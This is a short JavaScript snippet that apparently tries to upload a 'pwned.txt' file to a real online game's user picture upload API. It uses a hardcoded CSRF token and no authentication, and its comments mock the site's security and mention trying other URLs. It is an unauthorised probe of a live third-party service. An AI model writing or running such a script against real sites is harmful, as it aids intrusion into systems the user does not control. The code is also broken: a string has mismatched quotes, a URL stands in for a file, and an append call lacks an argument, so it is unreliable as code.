const serverUrl = 'https://apibeta.deeeep.io/users/uploadpic';
// I'm gonna try multiple URL's but I think this one is the best

const FilePath = '"https://cdn.jsdelivr.net/gh/garsfaad0dnimym/wabshur_decreative/pwned.txt';
// Just a lil test

const csrfToken = 'JLpliHxXOSxUmsfd';


const formData = new FormData();
formData.append('file', FilePath, 'pwned.txt');
formData.append(csrfToken);

// If I don't even need to do this your security sucks dude
const headers = {
  // might need to add anything neccesary like this below
  // 'Content-Type': 'multipart/form-data',
};


fetch(serverUrl, {
  method: 'POST',
  body: formData,
  headers: headers,
})
.then(response => response.json())
.then(data => {
  // Handle the server response if needed
  console.log('Server response:', data);
})
.catch(error => {
  console.error('Error:', error);
});